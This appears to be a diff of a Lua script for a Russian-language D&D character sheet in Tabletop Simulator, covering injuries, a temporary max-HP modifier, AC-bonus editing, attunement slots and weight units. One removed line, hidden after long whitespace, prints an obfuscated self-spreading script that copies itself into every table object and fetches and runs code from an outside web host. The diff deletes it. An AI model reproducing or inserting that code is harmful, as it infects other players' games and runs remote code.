--- ТРАВМЫ (штрафы к характеристикам, Максимуму хитов и Скорости)
+-- ТРАВМЫ (штрафы к характеристикам и Скорости)
 --
 -- Схема: ПКМ -> "Получить травму" открывает диалог выбора величины.
 -- После выбора она "взводится" (pendingInjuryAmount) и ждёт СЛЕДУЮЩЕГО
--- клика по одной из 8 подходящих точек (6 характеристик, Максимум хитов,
--- Скорость) — обычной, уже существующей. Этот клик подменяется: вместо
--- обычного шага применяется величина травмы, поле красится полупрозрачным
--- красным, взвод снимается. Если в момент клика поля заблокированы —
--- травма, как и обычное действие, не применяется (единое правило блокировки,
--- никакого отдельного обхода для травм не сделано ради простоты).
+-- клика по одной из 7 подходящих точек (6 характеристик, Скорость) —
+-- обычной, уже существующей. Этот клик подменяется: вместо обычного шага
+-- применяется величина травмы, поле красится полупрозрачным красным, взвод
+-- снимается. Если в момент клика поля заблокированы — травма, как и
+-- обычное действие, не применяется (единое правило блокировки, никакого
+-- отдельного обхода для травм не сделано ради простоты).
+--
+-- [ИЗМЕНЕНО] Максимум хитов травмами больше не снижается — временное
+-- повышение/понижение потолка хитов теперь отдельная функция, см. блок
+-- "ВРЕМЕННОЕ ИЗМЕНЕНИЕ МАКСИМУМА ХИТОВ" ниже.
 --============================================================
 
 -- Травма меняет только цвет шрифта (красный) — фон не трогаем нигде,
@@ -3224,25 +3605,14 @@ function clearInjuredFieldTint(fieldId)
     setInjuryTintForField(fieldId, buttonFontColor)
 end
 
--- Прибавляет delta к одному из 8 полей, поддерживающих травмы. Переиспользует
+-- Прибавляет delta к одному из 7 полей, поддерживающих травмы. Переиспользует
 -- уже существующие обработчики (со всем их пересчётом зависимостей), поэтому
 -- саму травму и её снятие проводит совершенно одинаково.
--- Если поле СЕЙЧАС снижено истощением (Максимум хитов/Скорость, см. блок
--- ИСТОЩЕНИЕ выше) — delta идёт не в уже сниженное отображаемое значение, а
--- в "чистую" базу истощения; иначе травма исказила бы саму базу, а после
--- снятия истощения появилось бы неверное число.
+-- Если поле СЕЙЧАС снижено истощением (Скорость, см. блок ИСТОЩЕНИЕ выше) —
+-- delta идёт не в уже сниженное отображаемое значение, а в "чистую" базу
+-- истощения; иначе травма исказила бы саму базу, а после снятия истощения
+-- появилось бы неверное число.
 function applyStatDelta(fieldId, delta)
-    if fieldId == RESOURCE_COUNTER_HP_MAX_ID then
-        if ref_buttonData.exhaustion.baseHp ~= nil then
-            ref_buttonData.exhaustion.baseHp = ref_buttonData.exhaustion.baseHp + delta
-            if ref_buttonData.exhaustion.baseHp < 0 then ref_buttonData.exhaustion.baseHp = 0 end
-            refreshExhaustionStatOverrides()
-        else
-            click_resource_counter(delta, RESOURCE_COUNTER_HP_MAX_ID)
-        end
-        return
-    end
-
     if fieldId == TEXTBOX_SPEED_ID then
         if ref_buttonData.exhaustion.baseSpeed ~= nil then
             ref_buttonData.exhaustion.baseSpeed = ref_buttonData.exhaustion.baseSpeed + delta
@@ -3283,7 +3653,7 @@ function onClickGetInjury(playerColor)
 
             broadcastToAll(
                 Player[playerColor].steam_name..": травма готова к применению ("..pendingInjuryAmount..
-                ") — кликните характеристику, Максимум хитов или Скорость."
+                ") — кликните характеристику или Скорость."
             )
         end
     )
@@ -3305,11 +3675,115 @@ function onClickRemoveInjuries(playerColor)
 
     ref_buttonData.injuries = {}
 
-    for _, fieldId in ipairs({PARAM_STR_ID, PARAM_DEX_ID, PARAM_CON_ID, PARAM_INT_ID, PARAM_WIS_ID, PARAM_CHA_ID, RESOURCE_COUNTER_HP_MAX_ID, TEXTBOX_SPEED_ID}) do
+    for _, fieldId in ipairs({PARAM_STR_ID, PARAM_DEX_ID, PARAM_CON_ID, PARAM_INT_ID, PARAM_WIS_ID, PARAM_CHA_ID, TEXTBOX_SPEED_ID}) do
         refreshFieldTint(fieldId)
     end
 
     updateSave()
+    updateLockContextMenu()
+end
+
+--============================================================
+-- ВРЕМЕННОЕ ИЗМЕНЕНИЕ МАКСИМУМА ХИТОВ
+--
+-- Один пункт контекстного меню (ПКМ по листу): "Добавить временные Макс.
+-- Хиты \ Временно отнять Макс. Хиты". По клику — свободный ввод числа (не
+-- список готовых величин, как у травм). Это СОСТОЯНИЕ, а не разовая правка:
+-- ref_buttonData.tempMaxHpModifier хранит ТЕКУЩЕЕ активное значение, и
+-- каждый новый ввод его ЗАМЕЩАЕТ (а не складывается с прежним) —
+-- диалог по умолчанию показывает то, что сейчас активно, чтобы было видно,
+-- что именно заменяется. Пустой ввод — явный сброс: снимает и увеличение, и
+-- уменьшение (модификатор становится 0).
+--
+-- Знак модификатора выбирает направление: положительный — Максимум хитов
+-- временно поднят, отрицательный — временно снижен. К счётчику Максимума
+-- хитов применяется только РАЗНИЦА между новым и старым модификатором (см.
+-- onClickChangeTempMaxHp) — так же, как если бы игрок вручную докрутил
+-- +/- на эту разницу; текущие хиты при этом не трогаются ни в какую
+-- сторону.
+--
+-- Разница применяется через click_resource_counter — благодаря этому
+-- автоматически получает и клампинг к 0, и корректную работу с "чистой"
+-- базой истощения (см. блок ИСТОЩЕНИЕ ниже), не дублируя эту логику здесь.
+--============================================================
+
+-- Бледно-зелёный/бледно-красный фон Максимума хитов — временно поднят/снижен
+local TEMP_MAX_HP_INCREASED_COLOR = {0.85, 1, 0.85}
+local TEMP_MAX_HP_DECREASED_COLOR = {1, 0.85, 0.85}
+
+-- Перекрашивает фон кнопки Максимума хитов по знаку текущего активного
+-- модификатора: >0 — бледно-зелёный, <0 — бледно-красный, 0 — обычный цвет.
+-- Вызывать и при загрузке листа (см. onload), иначе после
+-- сохранения/перезахода партии цвет фона не восстановится.
+function refreshMaxHpBackgroundColor()
+    local modifier = ref_buttonData.tempMaxHpModifier or 0
+    local color = buttonColor
+    if modifier > 0 then
+        color = TEMP_MAX_HP_INCREASED_COLOR
+    elseif modifier < 0 then
+        color = TEMP_MAX_HP_DECREASED_COLOR
+    end
+
+    self.editButton({
+        index = btnIndexByElementIdTable[RESOURCE_COUNTER_HP_MAX_ID],
+        color = color,
+    })
+end
+
+-- ПКМ -> "Добавить временные Макс. Хиты \ Временно отнять Макс. Хиты":
+-- свободный ввод числа. Поле подсказки по умолчанию заполнено ТЕКУЩИМ
+-- активным модификатором (или пусто, если сейчас 0) — введённое значение
+-- ЗАМЕЩАЕТ его целиком, пустой ввод сбрасывает в 0. Формат разбора числа —
+-- как у бонуса КД чуть выше по файлу (в т.ч. замена символа "−" на обычный
+-- минус "-" для tonumber).
+--
+-- [ИСПРАВЛЕНО] Максимум хитов блокируется отдельно от остальных resourceCounter
+-- при частичной блокировке листа (lockMode == 1, см. isResourceCounterLocked) —
+-- раньше эта функция такую блокировку не проверяла: click_resource_counter
+-- внутри неё молча ничего не менял, а tempMaxHpModifier и цвет фона всё
+-- равно обновлялись, как будто изменение прошло. Теперь при блокировке
+-- диалог вообще не открывается, игрок сразу видит понятную причину.
+function onClickChangeTempMaxHp(playerColor)
+    if isResourceCounterLocked(RESOURCE_COUNTER_HP_MAX_ID) then
+        printToColor("❌ Максимум хитов сейчас заблокирован (см. «⚙ Настройки» -> блокировка листа) — временное изменение не применено.", playerColor, {1, 0.6, 0})
+        return
+    end
+
+    local oldModifier = ref_buttonData.tempMaxHpModifier or 0
+    local defaultText = ""
+    if oldModifier > 0 then
+        defaultText = "+"..oldModifier
+    elseif oldModifier < 0 then
+        defaultText = tostring(oldModifier)
+    end
+
+    Player[playerColor].showInputDialog(
+        "Временное изменение Максимума хитов (+N/-N, пусто — сбросить)",
+        defaultText,
+        function(amountText)
+            local cleanText = (amountText or ""):gsub("−", "-"):gsub("%s+", "")
+
+            local newModifier
+            if cleanText == "" then
+                newModifier = 0
+            else
+                newModifier = tonumber(cleanText)
+                if newModifier == nil then
+                    printToColor("❌ Не удалось распознать число «"..tostring(amountText).."» — Максимум хитов не изменён.", playerColor, {1, 0.4, 0.4})
+                    return
+                end
+            end
+
+            local delta = newModifier - oldModifier
+            if delta ~= 0 then
+                click_resource_counter(delta, RESOURCE_COUNTER_HP_MAX_ID)
+            end
+
+            ref_buttonData.tempMaxHpModifier = newModifier
+            refreshMaxHpBackgroundColor()
+            updateSave()
+        end
+    )
 end
 
 --============================================================
@@ -3583,8 +4057,8 @@ function onClickExhaustionPlus(obj, playerColor)
     setExhaustionLevel(ref_buttonData.exhaustion.level + 1)
 end
 
--- Переключатель набора правил (метки/порядок — см. exhaustionRulesetLabels
--- и exhaustionRulesetOrder перед updateLockContextMenu; там же они и используются).
+-- Переключатель набора правил истощения (метки — см. exhaustionRulesetNames
+-- в блоке "ДИАЛОГ НАСТРОЕК" выше, там же и панель, которая это показывает).
 -- Смена правил тоже может пересечь порог смерти (например, персонаж стоял
 -- на 6 уровне под 2024, где смерти нет, а игрок переключил на 2014) —
 -- поэтому тоже проверяем через announceExhaustionDeathIfNewlyDead
@@ -3595,7 +4069,6 @@ function setExhaustionRuleset(ruleset)
 
     refreshExhaustionUI()
     refreshExhaustionStatOverrides()
-    updateLockContextMenu()
     updateSave()
 end
 
@@ -3664,6 +4137,18 @@ end
 
 local AC_BONUS_SLOT_COUNT = 5
 local AC_BONUS_CHECKBOX_ID_PREFIX = "ac_bonus_checkbox_"
+
+-- Есть ли хоть один созданный бонус к КД — используется, чтобы прятать пункт
+-- "Удалить бонус к КД" из контекстного меню, когда удалять нечего
+function hasAnyAcBonuses()
+    for slot = 1, AC_BONUS_SLOT_COUNT do
+        if ref_buttonData.acBonuses[slot] ~= nil then
+            return true
+        end
+    end
+    return false
+end
+
 
 -- Позиции чуть выше КД, в ряд
 local AC_BONUS_CHECKBOX_POS = {
@@ -3779,9 +4264,95 @@ function onClickCreateAcBonus(playerColor)
                     ref_buttonData.acBonuses[freeSlot] = {name = name, amount = amount, active = false}
                     refreshAcBonusCheckbox(freeSlot)
                     updateSave()
+                    updateLockContextMenu()
 
                     local sign = amount >= 0 and "+" or ""
                     printToColor("✅ Бонус «"..name.."» ("..sign..amount..") добавлен. Отметьте чекбокс рядом с КД, когда бонус нужно включить.", playerColor, {0, 1, 0})
+                end
+            )
+        end
+    )
+end
+
+-- ПКМ -> "Изменить бонус к КД": список текущих бонусов -> выбор -> новые
+-- имя и величина (поля предзаполнены текущими значениями, можно менять
+-- только одно из двух, просто оставив второе поле как есть). Если бонус
+-- сейчас активен, его старая величина сначала откатывается из КД, а затем,
+-- если он остаётся активным, накатывается уже новая — чтобы КД не разошёлся
+-- со значением на чекбоксе после редактирования
+function onClickEditAcBonus(playerColor)
+    local options = {}
+    local slotByOptionIndex = {}
+
+    for slot = 1, AC_BONUS_SLOT_COUNT do
+        local bonus = ref_buttonData.acBonuses[slot]
+        if bonus ~= nil then
+            local sign = bonus.amount >= 0 and "+" or ""
+            table.insert(options, bonus.name.." ("..sign..bonus.amount..")")
+            slotByOptionIndex[#options] = slot
+        end
+    end
+
+    if #options == 0 then
+        printToColor("❌ Бонусов к КД пока нет — нечего изменять.", playerColor, {1, 0.6, 0})
+        return
+    end
+
+    Player[playerColor].showOptionsDialog(
+        "Какой бонус к КД изменить?",
+        options,
+        1,
+        function(selectedText, selectedIndex)
+            local slot = slotByOptionIndex[selectedIndex]
+            local bonus = ref_buttonData.acBonuses[slot]
+            if bonus == nil then return end
+
+            Player[playerColor].showInputDialog(
+                "Новое название бонуса",
+                bonus.name,
+                function(newName)
+                    if newName == nil or newName == "" then
+                        return
+                    end
+
+                    local signedAmount = (bonus.amount >= 0 and "+" or "")..bonus.amount
+                    Player[playerColor].showInputDialog(
+                        "Новая величина бонуса (можно отрицательную, например -2)",
+                        signedAmount,
+                        function(amountText)
+                            local cleanText = (amountText or ""):gsub("−", "-")
+                            local newAmount = tonumber(cleanText)
+
+                            if newAmount == nil then
+                                printToColor("❌ Не удалось распознать число «"..tostring(amountText).."» — бонус не изменён.", playerColor, {1, 0.4, 0.4})
+                                return
+                            end
+
+                            -- Слот мог быть удалён, пока шли эти два диалога
+                            local currentBonus = ref_buttonData.acBonuses[slot]
+                            if currentBonus == nil then
+                                printToColor("❌ Этот бонус уже удалён — изменения не применены.", playerColor, {1, 0.6, 0})
+                                return
+                            end
+
+                            if currentBonus.active then
+                                applyAcBonusDelta(-currentBonus.amount)
+                            end
+
+                            currentBonus.name = newName
+                            currentBonus.amount = newAmount
+
+                            if currentBonus.active then
+                                applyAcBonusDelta(newAmount)
+                            end
+
+                            refreshAcBonusCheckbox(slot)
+                            updateSave()
+
+                            local sign = newAmount >= 0 and "+" or ""
+                            printToColor("✏️ Бонус изменён на «"..newName.."» ("..sign..newAmount..").", playerColor, {0.4, 0.8, 1})
+                        end
+                    )
                 end
             )
         end
@@ -3824,6 +4395,7 @@ function onClickRemoveAcBonus(playerColor)
             ref_buttonData.acBonuses[slot] = nil
             refreshAcBonusCheckbox(slot)
             updateSave()
+            updateLockContextMenu()
             printToColor("🗑️ Бонус «"..bonus.name.."» удалён.", playerColor, {0.9, 0.8, 0.2})
         end
     )
@@ -3851,6 +4423,115 @@ function createAcBonusCheckboxes()
             tooltip        = acBonusTooltip(slot),
             width          = 150,
         })
+    end
+end
+
+--============================================================
+-- НАСТРОЙКА НА МАГИЧЕСКИЕ ПРЕДМЕТЫ (ATTUNEMENT)
+--
+-- Правило D&D: одновременно можно быть настроенным не более чем на 3
+-- магических предмета. Три чекбокса — по одному на слот, тем же размером,
+-- что и чекбоксы испытаний от смерти (font_size/height/width = 200).
+-- Механически они ни на что не влияют — это просто три отметки. Клик по
+-- чекбоксу открывает нативный showInputDialog (тот же способ, что и для
+-- бонусов к КД/травм), куда игрок вписывает название предмета; текст
+-- сохраняется как tooltip чекбокса (виден при наведении) и одновременно
+-- определяет, занят ли слот — пустой ввод снимает отметку и возвращает
+-- слот в пустое состояние, непустой ставит крестик и сохраняет название.
+--
+-- ref_buttonData.attunement[slot] = "Плащ эльфийских магов" | nil
+--============================================================
+
+local ATTUNEMENT_SLOT_COUNT = 3
+local ATTUNEMENT_CHECKBOX_ID_PREFIX = "attunement_checkbox_"
+local ATTUNEMENT_CHECKBOX_SIZE = 200 -- как у чекбоксов испытаний от смерти
+
+-- Позиции трёх слотов — в ряд рядом с полем "Снаряжение" (TEXTBOX_EQUIPMENT_ID).
+-- Расстановка ориентировочная: при необходимости просто подвиньте координаты
+-- под расположение элементов на конкретной карте персонажа.
+local ATTUNEMENT_CHECKBOX_POS = {
+    {1.278,  0.1, -1.605},
+    {1.337, 0.1, -1.605},
+    {1.395, 0.1, -1.605},
+}
+
+-- Подсказка на пустом (незанятом) слоте
+local ATTUNEMENT_EMPTY_TOOLTIP = "Настройка на магический предмет (слот свободен)"
+
+-- Проверяет, должны ли слоты настройки быть заблокированы. Как и с
+-- испытаниями от смерти, это игровое состояние текущей сессии (а не билд
+-- персонажа), поэтому при частичной блокировке (lockMode == 1) остаётся
+-- доступным — блокируется только при полной блокировке листа (lockMode == 2)
+function isAttunementLocked()
+    return ref_buttonData.lockMode == 2
+end
+
+-- Подпись чекбокса слота: крестик, если слот занят (есть название), иначе пусто
+function attunementCheckboxLabel(slot)
+    if ref_buttonData.attunement[slot] ~= nil then
+        return CHECKBOX_CHAR_FULL
+    end
+    return CHECKBOX_CHAR_EMPTY
+end
+
+-- Подсказка при наведении: название предмета, если слот занят, иначе заглушка
+function attunementTooltip(slot)
+    return ref_buttonData.attunement[slot] or ATTUNEMENT_EMPTY_TOOLTIP
+end
+
+-- Перерисовывает конкретный чекбокс слота (метка + подсказка) — вызывается
+-- сразу после того, как игрок ввёл/стёр название предмета в диалоге
+function refreshAttunementCheckbox(slot)
+    self.editButton({
+        index   = btnIndexByElementIdTable[ATTUNEMENT_CHECKBOX_ID_PREFIX..slot],
+        label   = attunementCheckboxLabel(slot),
+        tooltip = attunementTooltip(slot),
+    })
+end
+
+-- Клик по чекбоксу слота настройки — открывает ввод названия предмета.
+-- Текущее название (если слот уже занят) подставляется в поле ввода, чтобы
+-- его можно было отредактировать, а не только стереть/заполнить с нуля
+function onClickAttunementCheckbox(slot, playerColor)
+    if isAttunementLocked() then
+        return
+    end
+
+    Player[playerColor].showInputDialog(
+        "Название предмета (слот "..slot.." из "..ATTUNEMENT_SLOT_COUNT.."). Пустое поле снимает настройку",
+        ref_buttonData.attunement[slot] or "",
+        function(text)
+            local trimmed = (text or ""):gsub("^%s+", ""):gsub("%s+$", "")
+            ref_buttonData.attunement[slot] = (trimmed ~= "") and trimmed or nil
+
+            refreshAttunementCheckbox(slot)
+            updateSave()
+        end
+    )
+end
+
+-- Создаёт 3 чекбокса-слота настройки на магические предметы
+function createAttunementCheckboxes()
+    for slot = 1, ATTUNEMENT_SLOT_COUNT do
+        local id = ATTUNEMENT_CHECKBOX_ID_PREFIX..slot
+        local funcName = "onClickAttunementCheckboxSlot"..slot
+        self.setVar(funcName, function(obj, playerColor) onClickAttunementCheckbox(slot, playerColor) end)
+
+        createBtnAndSaveIndex(id, {
+            click_function = funcName,
+            color          = buttonColor,
+            font_color     = buttonFontColor,
+            font_size      = ATTUNEMENT_CHECKBOX_SIZE,
+            function_owner = self,
+            height         = ATTUNEMENT_CHECKBOX_SIZE,
+            label          = attunementCheckboxLabel(slot),
+            position       = ATTUNEMENT_CHECKBOX_POS[slot],
+            scale          = buttonScale,
+            tooltip        = attunementTooltip(slot),
+            width          = ATTUNEMENT_CHECKBOX_SIZE,
+        })
+
+        spawnedButtonCount = spawnedButtonCount + 1
     end
 end
 
@@ -4044,15 +4725,31 @@ function onload(saved_data)
     if type(ref_buttonData.acBonuses) ~= "table" then
         ref_buttonData.acBonuses = {}
     end
+    -- Поддержка старых сохранений без поля настройки на магические предметы
+    if type(ref_buttonData.attunement) ~= "table" then
+        ref_buttonData.attunement = {}
+    end
     -- Поддержка старых сохранений без переключателя поглощения урона временными хитами
     if type(ref_buttonData.useTempHp) ~= "boolean" then
         ref_buttonData.useTempHp = true
+    end
+    -- Поддержка старых сохранений без состояния концентрации/настройки напоминания
+    if type(ref_buttonData.concentrationActive) ~= "boolean" then
+        ref_buttonData.concentrationActive = false
+    end
+    if type(ref_buttonData.concentrationReminderEnabled) ~= "boolean" then
+        ref_buttonData.concentrationReminderEnabled = true
     end
     -- diceSpawnPoint необязателен (nil = точка по умолчанию от листа) — если
     -- в сохранении пришло что-то повреждённое/не-таблица, лучше сбросить к nil,
     -- чем упасть при следующем броске
     if ref_buttonData.diceSpawnPoint ~= nil and type(ref_buttonData.diceSpawnPoint) ~= "table" then
         ref_buttonData.diceSpawnPoint = nil
+    end
+    -- Поддержка старых сохранений без привязки фигурки (см. блок
+    -- "СИНХРОНИЗАЦИЯ СО СТАТУСАМИ ФИГУРКИ"); также страхуемся от повреждённого значения
+    if ref_buttonData.linkedFigureGuid ~= nil and type(ref_buttonData.linkedFigureGuid) ~= "string" then
+        ref_buttonData.linkedFigureGuid = nil
     end
     -- Поддержка старых сохранений без счётчиков пищи/питья и переключателей единиц
     if ref_buttonData.resourceCounter[RESOURCE_COUNTER_FOOD_ID] == nil then
@@ -4075,6 +4772,16 @@ function onload(saved_data)
     end
     if type(ref_buttonData.heightUnitMetric) ~= "boolean" then
         ref_buttonData.heightUnitMetric = false
+    end
+    -- Поддержка старых сохранений без переключателя единицы грузоподъёмности
+    if type(ref_buttonData.weightUnitMetric) ~= "boolean" then
+        ref_buttonData.weightUnitMetric = false
+    end
+    if type(ref_buttonData.weightCapacityLb) ~= "number" then
+        ref_buttonData.weightCapacityLb = 0
+    end
+    if type(ref_buttonData.raiseLiftPullLb) ~= "number" then
+        ref_buttonData.raiseLiftPullLb = 0
     end
     -- Канонический рост в футах — если отсутствует (старое сохранение),
     -- считаем, что значение в поле "Рост" уже было в футах (единственный
@@ -4117,6 +4824,7 @@ function onload(saved_data)
     createHitDiceCounters()
     createExhaustionControls()
     createAcBonusCheckboxes()
+    createAttunementCheckboxes()
 
     updateJumpAndWeight()
     updateMonetWeight()
@@ -4126,10 +4834,12 @@ function onload(saved_data)
     applyCounterLockVisuals()
     applyResourceCounterLockVisuals()
     applyInjuryVisuals()
+    refreshMaxHpBackgroundColor()
     updateLockContextMenu()
     refreshExhaustionUI()
     refreshExhaustionStatOverrides()
     refreshSpellcastingDefaults()
+    initStatusIconSync()
 end
 
 --Функции-обработчики кликов по кнопкам
@@ -4294,6 +5004,7 @@ function click_counter(amount, counterId)
 
         ref_buttonData.injuries[paramId] = (ref_buttonData.injuries[paramId] or 0) + amount
         tintInjuredField(paramId)
+        updateLockContextMenu()
     end
 
     ref_buttonData.counter[counterId].value = ref_buttonData.counter[counterId].value + amount
@@ -4369,15 +5080,6 @@ function click_resource_counter(amount, counterId)
         return
     end
 
-    -- Если взведена травма и это Максимум хитов — клик применяет её вместо обычного шага.
-    -- Остальные resourceCounter (текущие/временные хиты, монеты) травмы не поддерживают.
-    if pendingInjuryAmount ~= nil and counterId == RESOURCE_COUNTER_HP_MAX_ID then
-  amount = pendingInjuryAmount
-  pendingInjuryAmount = nil
-
-  ref_buttonData.injuries[counterId] = (ref_buttonData.injuries[counterId] or 0) + amount
-    end
-
     -- Максимум хитов, пока его снижает истощение (см. блок ИСТОЩЕНИЕ выше):
     -- и обычный шаг, и применение травмы идут не в уже сниженное отображаемое
     -- значение, а в "чистую" базу истощения — иначе после снятия истощения
@@ -4438,6 +5140,17 @@ function click_resource_counter(amount, counterId)
   end
     end
 
+    -- Напоминание о концентрации — после того, как урон уже применён к
+    -- хитам, но до updateSave() (порядок значения не имеет, это просто
+    -- логическое место рядом с остальной пост-обработкой клика).
+    -- Не считаем и не шлём напоминание прямо здесь: клик уходит в
+    -- дебаунсер (см. блок "КОНЦЕНТРАЦИЯ" выше), который сам соберёт всю
+    -- "пачку" кликов за CONCENTRATION_DEBOUNCE_SECONDS (в т.ч. учтёт
+    -- коррекцию кликами +) и пришлёт одно итоговое сообщение.
+    if counterId == RESOURCE_COUNTER_HP_CURRENT_ID or counterId == RESOURCE_COUNTER_HP_TEMPORARY_ID then
+  registerConcentrationHpDelta(amount)
+    end
+
     -- Изменилось количество монет — пересчитываем их вес
     if weightAffectingCounterIds[counterId] == true then
   updateMonetWeight()
@@ -4490,6 +5203,7 @@ self.editInput({
       local injuryAmount = pendingInjuryAmount
       pendingInjuryAmount = nil
       ref_buttonData.injuries[textboxId] = (ref_buttonData.injuries[textboxId] or 0) + injuryAmount
+      updateLockContextMenu()
 
       if ref_buttonData.exhaustion.baseSpeed ~= nil then
     ref_buttonData.exhaustion.baseSpeed = ref_buttonData.exhaustion.baseSpeed + injuryAmount
@@ -4615,18 +5329,22 @@ function checkOvercumbrance()
   tooltip = nil,
     }
 
+    -- Сравниваем ВСЕГДА в фунтах (weightCapacityLb/raiseLiftPullLb —
+    -- канонические значения из updateJumpAndWeight), а не с value дисплея:
+    -- value дисплея может быть переведено в кг переключателем единицы
+    -- (см. setWeightUnitMetric), а ref_buttonData.monetWeight всегда в фунтах.
     local weightLimits = {
-  DISPLAY_WEIGHT_CAPACITY_ID,
-  DISPLAY_RAISE_LIFT_AND_PULL_ID,
+  { id = DISPLAY_WEIGHT_CAPACITY_ID,      limitLb = ref_buttonData.weightCapacityLb },
+  { id = DISPLAY_RAISE_LIFT_AND_PULL_ID,  limitLb = ref_buttonData.raiseLiftPullLb },
     }
-    for i, weightLimitDisplayId in ipairs(weightLimits) do
-  if ref_buttonData.monetWeight > ref_buttonData.display[weightLimitDisplayId].value then
+    for i, weightLimit in ipairs(weightLimits) do
+  if ref_buttonData.monetWeight > weightLimit.limitLb then
 local params = redBtnParams
-params.index = btnIndexByElementIdTable[weightLimitDisplayId]
+params.index = btnIndexByElementIdTable[weightLimit.id]
 self.editButton(params)
   else
 local params = normalBtnParams
-params.index = btnIndexByElementIdTable[weightLimitDisplayId]
+params.index = btnIndexByElementIdTable[weightLimit.id]
 self.editButton(params)
   end
     end
@@ -4703,20 +5421,38 @@ function updateJumpAndWeight()
   weightCapacityKoef = 2
     end
 
-    -- Обновляем грузоподъёмность
-    local weightCapacity = ref_buttonData.counter[COUNTER_PARAM_STR_ID].value * 15 * weightCapacityKoef
-    ref_buttonData.display[DISPLAY_WEIGHT_CAPACITY_ID].value = weightCapacity
+    -- Грузоподъёмность и "поднять/толкнуть/потащить" считаются по правилам
+    -- D&D в фунтах (Сила × 15) — это КАНОНИЧЕСКИЕ значения, сохраняем их
+    -- отдельно (weightCapacityLb/raiseLiftPullLb), чтобы checkOvercumbrance
+    -- могла сравнивать с весом монет (тоже в фунтах) независимо от того,
+    -- в чём сейчас отображается лимит на дисплее (см. setWeightUnitMetric).
+    local weightCapacityLb = ref_buttonData.counter[COUNTER_PARAM_STR_ID].value * 15 * weightCapacityKoef
+    local raiseLiftPullLb = weightCapacityLb * 2
+    ref_buttonData.weightCapacityLb = weightCapacityLb
+    ref_buttonData.raiseLiftPullLb = raiseLiftPullLb
+
+    -- Обновляем грузоподъёмность (в выбранной единице отображения)
+    local weightCapacityDisplay = weightCapacityLb
+    if ref_buttonData.weightUnitMetric then
+  weightCapacityDisplay = roundToHalf(weightCapacityLb * LB_TO_KG)
+    end
+    ref_buttonData.display[DISPLAY_WEIGHT_CAPACITY_ID].value = weightCapacityDisplay
     self.editButton({
   index = btnIndexByElementIdTable[DISPLAY_WEIGHT_CAPACITY_ID],
-  label = weightCapacity,
+  label = weightCapacityDisplay,
+  tooltip = weightUnitTooltip[ref_buttonData.weightUnitMetric],
     })
 
-    -- Обновляем "поднять/толкнуть/потащить"
-    local raiseLiftPullCapacity = weightCapacity * 2
-    ref_buttonData.display[DISPLAY_RAISE_LIFT_AND_PULL_ID].value = raiseLiftPullCapacity
+    -- Обновляем "поднять/толкнуть/потащить" (та же единица, что и грузоподъёмность)
+    local raiseLiftPullDisplay = raiseLiftPullLb
+    if ref_buttonData.weightUnitMetric then
+  raiseLiftPullDisplay = roundToHalf(raiseLiftPullLb * LB_TO_KG)
+    end
+    ref_buttonData.display[DISPLAY_RAISE_LIFT_AND_PULL_ID].value = raiseLiftPullDisplay
     self.editButton({
   index = btnIndexByElementIdTable[DISPLAY_RAISE_LIFT_AND_PULL_ID],
-  label = raiseLiftPullCapacity,
+  label = raiseLiftPullDisplay,
+  tooltip = weightUnitTooltip[ref_buttonData.weightUnitMetric],
     })
 
     -- Обновляем высоту прыжка
@@ -6077,5 +6813,453 @@ function createInputAndSaveIndex(inputId, params)
     self.createInput(params)
     local inputTable = self.getInputs()
     inputIndexByElementIdTable[inputId] = inputTable[#inputTable].index
-end                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]
+end
 
+--============================================================
+-- СИНХРОНИЗАЦИЯ СО СТАТУСАМИ ФИГУРКИ (Маркиратор)
+--
+-- Модель — ПОДПИСКА, не опрос. Никаких Wait.time-циклов, работающих
+-- постоянно: лист один раз регистрируется у фигурки как слушатель
+-- (RegisterListener), и дальше фигурка САМА присылает обновление
+-- (OnFigureStatusChanged) только в момент реального изменения набора
+-- статусов — событие, а не таймер. При большом числе промаркированных
+-- фигурок на столе это не создаёт никакой фоновой нагрузки: пока статусы
+-- не меняются, между листом и фигуркой не происходит вообще ничего.
+--
+-- Привязка: ПКМ по листу -> "Привязать фигурку", затем TAB-пинг по
+-- нужной фигурке (обычный игровой пинг, наведя курсор и нажав Tab) —
+-- используется тот же встроенный onPlayerPing, что и для точки спавна
+-- кубиков (см. выше), через объект player.getHoverObject().
+--
+-- Оптимизации:
+--   • полный реестр картинок (status_registry) передаётся только ОДИН РАЗ
+--     при регистрации — дальнейшие уведомления об изменении статусов несут
+--     только сами статусы, реестр на листе уже закэширован;
+--   • фигурка сама не шлёт повторное уведомление, если фактический набор
+--     активных статусов не изменился (см. lastNotifiedSignature в
+--     Маркиратор_V11.lua) — так что даже "лишний" клик по уже активной
+--     иконке не порождает сетевого вызова;
+--   • self.UI.setXml/setCustomAssets на листе тоже вызываются только when
